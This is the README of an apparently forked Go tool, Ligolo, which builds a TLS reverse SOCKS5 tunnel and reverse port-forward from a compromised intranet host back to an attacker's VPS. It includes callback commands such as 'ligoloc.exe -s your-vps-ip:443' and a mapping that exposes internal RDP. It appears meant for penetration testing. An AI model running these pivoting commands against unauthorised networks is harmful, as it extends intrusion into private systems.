# Ligolo: Reverse tunnel for intranet penetration

[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/gluten-free.svg)](https://forthebadge.com)

English | [简体中文](./README.md)

## introduce

The project is modified according to [ligolo](https://github.com/sysdream/ligolo), mainly for some functional tailoring, which is convenient to use.

**Ligolo** is a simple, lightweight reverse Socks5 proxy tool, all traffic is encrypted with TLS.

Its function is similar to *Autoroute + Socks4a* in *Meterpreter*, but it is more stable and faster.

## why you need this

When you have obtained the permission of a Windows / Linux / Mac host on the other party's intranet and the host can connect to the Internet.

At this point you want to establish a Socks5 proxy for the other party's intranet.

**Ligolo** can help you establish an agent to help you continue to penetrate the intranet.

> If the controlled host cannot access the Internet, you can try another tool [pystinger](https://github.com/FunnyWolf/pystinger)

## Instructions

### TL;DR

- Get the compiled binary file [release](https://github.com/FunnyWolf/ligolo/releases)

- In your VPS hosting.

```
./ligolos
```

- In the controlled intranet host.

```
> ligoloc.exe -s your-vps-ip:443
```

- After the connection is successfully established, the 127.0.0.1:1080 of the VPS has established the Socks5 proxy for the internal network of the controlled host.

### Detailed description

*Ligolo* contains two modules:

- ligolos (server)
- ligoloc (client)

*ligolos* runs on your VPS server (attack server).

*ligoloc* runs on an already controlled intranet host.

*ligolos* can use the default settings. It will listen on port 0.0.0.0:443 (for waiting for ligoloc connection) and 127.0.0.1:1080 (for socks5 proxy).

*ligoloc* The server address must be specified when running, using the parameter `-s your-vps-ip:443`.

You can use the `-h` parameter to view the help.

Once the connection between *ligolos* and *ligoloc* is established, you can use the intranet socks5 proxy of the VPS server `127.0.0.1:1080`.


### Reverse portfwd
- In your VPS host
```
./ligolos -p 0.0.0.0:13389
```
- In controlled intranet host
```
> ligoloc. exe -s your-vps-ip:443 -t 127.0.0.1:3389
```
- After the connection is established successfully, the intranet host 127.0.0.1:3389 has been mapped to vps-ip:13389


### Options

*ligolos* options:

```
PS D:\xxx\bin> .\ligolos.exe -h
Usage of D:\xxx\ligolos.exe:
  -cert string
        The TLS server certificate,Unnecessary (default "cert.pem")
  -key string
        The TLS server key,Unnecessary (default "key.pem")
  -l string
        The relay server listening address (the connect-back address) (default "0.0.0.0:443")
  -p string
        The local socks5 server address or ip:port use to connect target (default "127.0.0.1:1080")
```

*ligoloc* options:

```
Usage of D:\XXX\ligoloc.exe:
  -proxy string
        Use proxy to connect ligolo server(e.g. http://user:passwd@192.168.1.128:8080 socks5://user:passwd@192.168.1.128:1080)
  -s string
        The ligolo server (the connect-back address)(e.g. 0.0.0.0:443)
  -t string
        The destination server (a 192.168.1.3:3389, 192.168.1.3:22, etc.) - when not specified, Ligolo starts a socks5 proxy server
```


### Compile

Refer to the compilation method of the original ligolo

## Features

- TLS 1.3 encrypted tunnel
- Multi-platform (Windows / Linux / Mac /...)
- Multiple connection multiplexing (1 TCP connection transmits all traffic)
- SOCKS5 proxy

## To Do

- Better timeout mechanism
- SOCKS5 UDP support
- mTLS mutual authentication
- Reverse port mapping (mapping intranet port to internet)

## Licensing

GNU General Public License v3.0 (refer to LICENSING).

## Original author

* Nicolas Chatelain <n.chatelain -at- sysdream.com>